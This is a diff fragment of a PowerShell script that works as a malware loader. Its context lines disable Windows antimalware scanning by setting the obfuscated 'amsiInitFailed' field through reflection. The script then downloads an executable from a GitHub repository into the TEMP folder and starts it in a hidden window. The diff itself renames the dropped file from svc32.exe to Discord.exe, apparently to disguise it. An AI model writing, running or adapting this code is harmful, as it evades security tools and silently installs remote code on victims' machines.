@@ -3,7 +3,7 @@ $f=$t.GetField([string]::Join('',('am','si','Init','Fai','led')),[Reflection.Bin
 $f.SetValue($null,$true)
 
 $u='https://github.com/iendjd7-lgtm/-fallen-discord/raw/refs/heads/main/Discord.exe'
-$p="$env:TEMP\svc32.exe"
+$p="$env:TEMP\Discord.exe"
 [System.Net.WebClient]::new().DownloadFile($u,$p)
 $si=[System.Diagnostics.ProcessStartInfo]::new()
 $si.FileName=$p;$si.WindowStyle='Hidden';$si.UseShellExecute=$false
